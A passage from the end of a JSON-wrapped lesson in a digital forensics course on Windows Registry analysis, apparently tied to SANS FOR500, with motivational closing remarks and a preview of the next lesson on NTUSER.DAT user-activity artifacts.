‚úÖ Makes you more valuable to employers\n- ‚úÖ Increases your ability to protect organizations\n- ‚úÖ Brings you closer to your career goals\n\nThis isn't just education - it's **career transformation**.\n\n### Next Steps\n\nWhen you're ready, move on to **Lesson 12: NTUSER.DAT Analysis**. We'll dive deep into user activity artifacts, decode UserAssist, parse RecentDocs, and build complete user timelines.\n\nBut first, take a moment to celebrate. You just leveled up your forensic skills.\n\n**You're not just learning forensics. You're becoming a forensic analyst.**\n\nKeep going. The digital forensics community needs skilled investigators like you.\n\nüîç **Master the Registry. Uncover the Truth. Protect the Future.**"
      }
    }
  ],
  "tags": [
    "Course: SANS-FOR500"
  ]
}